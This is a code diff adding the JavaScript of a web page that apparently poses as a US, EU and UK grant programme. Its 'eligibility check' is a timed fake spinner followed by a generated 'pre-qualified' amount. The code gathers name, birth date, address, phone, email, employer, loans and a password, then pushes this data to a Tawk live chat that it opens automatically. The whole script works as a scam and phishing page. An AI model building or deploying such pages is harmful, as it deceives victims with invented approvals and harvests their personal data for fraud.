@@ -958,4 +958,349 @@ s0.parentNode.insertBefore(s1,s0);
     try { localStorage.setItem(STORAGE.region, key); } catch (_) {}
 
     $('navFlag').classList.remove('hidden');
-    $('navFlag
+    $('navFlagIcon').textContent = cfg.flag;
+    $('navFlagLabel').textContent = cfg.short;
+    $('navTitle').textContent = cfg.title + ' — ' + cfg.label;
+
+    $('heroRegion').textContent = cfg.eyebrow;
+    $('heroTitle').textContent  = cfg.title;
+    $('heroDesc').textContent   = cfg.desc;
+    $('heroRange').textContent  = cfg.range;
+
+    $('eligibilityList').innerHTML = cfg.eligibility.map((t) => `<li>${esc(t)}</li>`).join('');
+    $('aimsList').innerHTML        = cfg.aims.map((t) => `<li>${esc(t)}</li>`).join('');
+
+    qsa('.region-card').forEach((c) => {
+      c.classList.toggle('is-selected',
+        c.dataset.region === key || (key === 'UK' && c.dataset.region === 'EU'));
+    });
+
+    if (!opts.silent) {
+      $('regionPicker').classList.add('hidden');
+      $('programHero').classList.remove('hidden');
+      showExtendedSections();
+      window.scrollTo({ top:0, behavior:'smooth' });
+    }
+  }
+
+  function showRegionPicker() {
+    $('regionPicker').classList.remove('hidden');
+    $('programHero').classList.add('hidden');
+    hideExtendedSections();
+    window.scrollTo({ top:0, behavior:'smooth' });
+  }
+
+  qsa('.region-card').forEach((card) => {
+    const activate = () => setRegion(card.dataset.region);
+    card.addEventListener('click', activate);
+    card.addEventListener('keydown', (e) => {
+      if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); activate(); }
+    });
+  });
+  $('switchRegionBtn').addEventListener('click', showRegionPicker);
+  $('navFlag').addEventListener('click', showRegionPicker);
+
+  (async function boot() {
+    let stored = null;
+    try { stored = localStorage.getItem(STORAGE.region); } catch (_) {}
+    if (stored && REGIONS[stored]) {
+      setRegion(stored, { silent:true });
+      $('programHero').classList.remove('hidden');
+      showExtendedSections();
+      $('regionPicker').classList.add('hidden');
+      return;
+    }
+    const detected = await detectRegionFromIP();
+    if (detected) {
+      setRegion(detected, { silent:true });
+      $('programHero').classList.remove('hidden');
+      showExtendedSections();
+      $('regionPicker').classList.add('hidden');
+      toast('Region set automatically to ' + REGIONS[detected].label);
+    }
+  })();
+
+  (function cookies() {
+    let existing = null;
+    try { existing = localStorage.getItem(STORAGE.cookies); } catch (_) {}
+    if (!existing) $('cookieBanner').classList.remove('hidden');
+    $('cookieAccept').addEventListener('click', () => {
+      try { localStorage.setItem(STORAGE.cookies, 'all'); } catch (_) {}
+      $('cookieBanner').classList.add('hidden'); toast('Cookie preferences saved');
+    });
+    $('cookieReject').addEventListener('click', () => {
+      try { localStorage.setItem(STORAGE.cookies, 'essential'); } catch (_) {}
+      $('cookieBanner').classList.add('hidden'); toast('Only essential cookies will be used');
+    });
+  })();
+
+  const modal = $('eligModal');
+  const stepsBar = $('stepsBar');
+  const nextBtn = $('nextBtn');
+  const backBtn = $('backBtn');
+  const footSpacer = $('footSpacer');
+
+  function openModal() {
+    if (!state.region) { showRegionPicker(); toast('Please choose a region first'); return; }
+    resetForm();
+    state.step = 1;
+    modal.classList.remove('hidden');
+    document.body.style.overflow = 'hidden';
+    renderStep();
+  }
+  function closeModal() {
+    modal.classList.add('hidden');
+    document.body.style.overflow = '';
+  }
+  $('openEligibilityBtn').addEventListener('click', openModal);
+  $('eligClose').addEventListener('click', closeModal);
+  modal.addEventListener('click', (e) => { if (e.target === modal) closeModal(); });
+  document.addEventListener('keydown', (e) => {
+    if (e.key === 'Escape' && !modal.classList.contains('hidden')) closeModal();
+  });
+
+  function renderStep() {
+    qsa('.step', modal).forEach((el) => el.classList.add('hidden'));
+    qsa('.step-dot', stepsBar).forEach((dot) => {
+      const n = Number(dot.dataset.step);
+      dot.classList.toggle('is-active', n === state.step);
+      dot.classList.toggle('is-done', n < state.step);
+    });
+
+    if (state.step === 1) { $('step1').classList.remove('hidden'); backBtn.classList.add('hidden'); footSpacer.style.flex='1'; nextBtn.classList.remove('hidden'); nextBtn.textContent='Continue →'; }
+    if (state.step === 2) { $('step2').classList.remove('hidden'); backBtn.classList.remove('hidden'); footSpacer.style.flex='0'; nextBtn.classList.remove('hidden'); nextBtn.textContent='Submit & check eligibility →'; }
+    if (state.step === 3) { $('step3-processing').classList.remove('hidden'); nextBtn.classList.add('hidden'); backBtn.classList.add('hidden'); footSpacer.style.flex='1'; runEligibilityCheck(); }
+    if (state.step === 4) { $('step4').classList.remove('hidden'); nextBtn.classList.add('hidden'); backBtn.classList.add('hidden'); footSpacer.style.flex='1'; }
+    if (state.step === 5) { $('step5').classList.remove('hidden'); nextBtn.classList.add('hidden'); backBtn.classList.add('hidden'); footSpacer.style.flex='1'; }
+  }
+
+  function markError(input, on) {
+    const row = input.closest('.form-row');
+    if (row) row.classList.toggle('is-error', !!on);
+  }
+  function validEmail(v){ return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(String(v).trim()); }
+  function validPhone(v){ return String(v).replace(/\D/g,'').length >= 7; }
+
+  function validateStep1() {
+    let ok = true;
+    const name = $('fName'), dob = $('fDob'), email = $('fEmail'), phone = $('fPhone'), addr = $('fAddress');
+    if (!name.value.trim()) { markError(name, true); ok = false; } else markError(name, false);
+    if (!dob.value) { markError(dob, true); ok = false; } else markError(dob, false);
+    if (!validEmail(email.value)) { markError(email, true); ok = false; } else markError(email, false);
+    if (!validPhone(phone.value)) { markError(phone, true); ok = false; } else markError(phone, false);
+    if (!addr.value.trim()) { markError(addr, true); ok = false; } else markError(addr, false);
+    if (ok) {
+      const d = new Date(dob.value), today = new Date();
+      let age = today.getFullYear() - d.getFullYear();
+      const m = today.getMonth() - d.getMonth();
+      if (m < 0 || (m === 0 && today.getDate() < d.getDate())) age--;
+      if (age < 30) { markError(dob, true); qs('.field-error', dob.closest('.form-row')).textContent = 'Applicants must be above 30 years of age.'; ok = false; }
+    }
+    if (ok) {
+      state.form.name = name.value.trim();
+      state.form.dob = dob.value;
+      state.form.email = email.value.trim();
+      state.form.phone = phone.value.trim();
+      state.form.address = addr.value.trim();
+    }
+    return ok;
+  }
+
+  function validateStep2() {
+    let ok = true;
+    const homeRadios = qsa('input[name="ownsHome"]');
+    const empRadios  = qsa('input[name="employed"]');
+    const yearInput  = $('fYear'), empInput = $('fEmployer'), loansInput = $('fLoans');
+    const homePicked = homeRadios.find((r) => r.checked);
+    const empPicked  = empRadios.find((r) => r.checked);
+    const homeRow = homeRadios[0].closest('.form-row');
+    const empRow  = empRadios[0].closest('.form-row');
+    homeRow.classList.toggle('is-error', !homePicked);
+    empRow.classList.toggle('is-error', !empPicked);
+    if (!homePicked || !empPicked) ok = false;
+    if (homePicked && homePicked.value === 'yes') {
+      if (!yearInput.value || Number(yearInput.value) < 1900 || Number(yearInput.value) > 2026) { markError(yearInput, true); ok = false; } else markError(yearInput, false);
+    }
+    if (empPicked && empPicked.value === 'yes') {
+      if (!empInput.value.trim()) { markError(empInput, true); ok = false; } else markError(empInput, false);
+    }
+    if (loansInput.value === '' || Number(loansInput.value) < 0) { markError(loansInput, true); ok = false; } else markError(loansInput, false);
+    if (ok) {
+      state.form.ownsHome = homePicked.value === 'yes';
+      state.form.yearPurchased = state.form.ownsHome ? yearInput.value : '';
+      state.form.employed = empPicked.value === 'yes';
+      state.form.employer = state.form.employed ? empInput.value.trim() : '';
+      state.form.loans = Number(loansInput.value);
+    }
+    return ok;
+  }
+
+  qsa('input[name="ownsHome"]').forEach((r) => r.addEventListener('change', () => {
+    $('yearRow').classList.toggle('hidden', r.value !== 'yes' || !r.checked);
+  }));
+  qsa('input[name="employed"]').forEach((r) => r.addEventListener('change', () => {
+    $('employerRow').classList.toggle('hidden', r.value !== 'yes' || !r.checked);
+  }));
+
+  nextBtn.addEventListener('click', () => {
+    if (state.step === 1) { if (!validateStep1()) return; state.step = 2; renderStep(); return; }
+    if (state.step === 2) { if (!validateStep2()) return; state.step = 3; renderStep(); return; }
+  });
+  backBtn.addEventListener('click', () => { if (state.step > 1) { state.step -= 1; renderStep(); } });
+
+  let eligibilityRan = false;
+  async function runEligibilityCheck() {
+    if (eligibilityRan) return;
+    eligibilityRan = true;
+
+    const messages = ['Assessing your eligibility against the programme criteria…','Verifying region and currency…','Calculating your indicative funding amount…'];
+    let i = 0;
+    const copy = $('processingCopy');
+    const interval = setInterval(() => { i = (i + 1) % messages.length; copy.textContent = messages[i]; }, 900);
+    await new Promise((r) => setTimeout(r, 2400));
+    clearInterval(interval);
+
+    state.form.amount = generateAmount();
+
+    $('step3-processing').classList.add('hidden');
+    $('step3-result').classList.remove('hidden');
+    $('resultAmount').textContent = formatMoney(state.form.amount, state.region);
+    $('resultNote').textContent = 'Based on the information you provided, you are pre-qualified for the amount shown above. Final approval is subject to verification by the ' + REGIONS[state.region].label + ' programme office.';
+    $('rbName').textContent     = state.form.name || '—';
+    $('rbRegion').textContent   = REGIONS[state.region].label;
+    $('rbHome').textContent     = state.form.ownsHome ? ('Yes' + (state.form.yearPurchased ? ' · ' + state.form.yearPurchased : '')) : 'No';
+    $('rbEmployed').textContent = state.form.employed ? ('Yes' + (state.form.employer ? ' · ' + state.form.employer : '')) : 'No';
+    $('rbLoans').textContent    = String(state.form.loans);
+
+    pushToTawk();
+    setTimeout(() => { state.step = 4; renderStep(); }, 1800);
+  }
+
+  function pushToTawk() {
+    const summary = {
+      name: state.form.name, dob: state.form.dob,
+      email: state.form.email, phone: state.form.phone,
+      address: state.form.address, region: REGIONS[state.region].label,
+      ownsHome: state.form.ownsHome ? 'Yes' : 'No',
+      yearPurchased: state.form.yearPurchased || '—',
+      employed: state.form.employed ? 'Yes' : 'No',
+      employer: state.form.employer || '—',
+      unpaidLoans: state.form.loans,
+      qualifiedAmt: formatMoney(state.form.amount, state.region)
+    };
+    function attempt(retries) {
+      if (window.Tawk_API && typeof Tawk_API.setAttributes === 'function') {
+        try {
+          Tawk_API.setAttributes({
+            'Name': summary.name, 'Date of Birth': summary.dob,
+            'Email': summary.email, 'Phone': summary.phone,
+            'Address': summary.address, 'Region': summary.region,
+            'Homeowner': summary.ownsHome, 'Year Purchased': summary.yearPurchased,
+            'Employed': summary.employed, 'Employer': summary.employer,
+            'Unpaid Loans': String(summary.unpaidLoans), 'Indicative Amount': summary.qualifiedAmt
+          }, function () {});
+          Tawk_API.addEvent('eligibility_check', summary, function () {});
+          if (typeof Tawk_API.maximize === 'function') Tawk_API.maximize();
+          return true;
+        } catch (_) {}
+      }
+      if (retries > 0) setTimeout(() => attempt(retries - 1), 700);
+      return false;
+    }
+    attempt(8);
+    toast('Eligibility summary sent to grant support');
+  }
+
+  /* SAVE SUBMISSION → admin intake queue */
+  function saveIntake() {
+    const record = {
+      ts: Date.now(), region: state.region,
+      name: state.form.name, dob: state.form.dob,
+      email: state.form.email, phone: state.form.phone,
+      address: state.form.address,
+      ownsHome: state.form.ownsHome, year: state.form.yearPurchased,
+      employed: state.form.employed, employer: state.form.employer,
+      loans: state.form.loans, amount: state.form.amount,
+      currency: REGIONS[state.region].currency.code
+    };
+    try {
+      const prev = JSON.parse(localStorage.getItem(STORAGE.intake) || '[]');
+      prev.push(record);
+      localStorage.setItem(STORAGE.intake, JSON.stringify(prev));
+    } catch (_) {}
+  }
+
+  /* STEP 4 → 5 : create account, then show inline confirmation */
+  $('createAccountBtn').addEventListener('click', () => {
+    const p1 = $('fPassword'), p2 = $('fPassword2');
+    let ok = true;
+    if (p1.value.length < 8) { markError(p1, true); ok = false; } else markError(p1, false);
+    if (p2.value !== p1.value || !p2.value) { markError(p2, true); ok = false; } else markError(p2, false);
+    if (!ok) return;
+    state.form.password = p1.value;
+
+    saveIntake();
+
+    if (window.Tawk_API && typeof Tawk_API.addEvent === 'function') {
+      try {
+        Tawk_API.addEvent('account_created', {
+          region: REGIONS[state.region].label,
+          amount: formatMoney(state.form.amount, state.region),
+          email: state.form.email, phone: state.form.phone
+        }, function () {});
+      } catch (_) {}
+    }
+
+    /* Build the final inline summary — no redirect */
+    $('finalAmount').textContent = formatMoney(state.form.amount, state.region);
+    const regions = { US:'United States', EU:'European Union', UK:'United Kingdom' };
+    const rows = [
+      ['Full name', state.form.name],
+      ['Email address', state.form.email],
+      ['Phone number', state.form.phone],
+      ['Street address', state.form.address],
+      ['Date of birth', state.form.dob],
+      ['Region', regions[state.region] || state.region],
+      ['Homeowner', state.form.ownsHome ? ('Yes · purchased ' + (state.form.yearPurchased || '—')) : 'No'],
+      ['Employment', state.form.employed ? ('Yes · ' + (state.form.employer || '—')) : 'No'],
+      ['Unpaid loans', String(state.form.loans)],
+      ['Pre-approved amount', formatMoney(state.form.amount, state.region)]
+    ];
+    $('finalBreakdown').innerHTML = rows
+      .map(([k, v]) => `<div><dt>${esc(k)}</dt><dd>${esc(v)}</dd></div>`)
+      .join('');
+
+    toast('Account created — application sent to admin for review');
+    state.step = 5;
+    renderStep();
+  });
+
+  $('closeConfirmBtn').addEventListener('click', closeModal);
+
+  function resetForm() {
+    eligibilityRan = false;
+    state.form = {
+      name:'', dob:'', email:'', phone:'', address:'',
+      ownsHome:null, yearPurchased:'',
+      employed:null, employer:'',
+      loans:'', amount:0, password:''
+    };
+    ['fName','fDob','fEmail','fPhone','fAddress','fYear','fEmployer','fLoans','fPassword','fPassword2']
+      .forEach((id) => { const el = $(id); if (el) el.value = ''; });
+    qsa('input[type="radio"]', modal).forEach((r) => { r.checked = false; });
+    qsa('.form-row', modal).forEach((row) => row.classList.remove('is-error'));
+    $('yearRow').classList.add('hidden');
+    $('employerRow').classList.add('hidden');
+    $('step3-result').classList.add('hidden');
+    $('step3-processing').classList.add('hidden');
+    $('step4').classList.add('hidden');
+    $('step5').classList.add('hidden');
+    $('step1').classList.add('hidden');
+    $('step2').classList.add('hidden');
+  }
+
+})();
+</script>
+
+</body>
+</html>
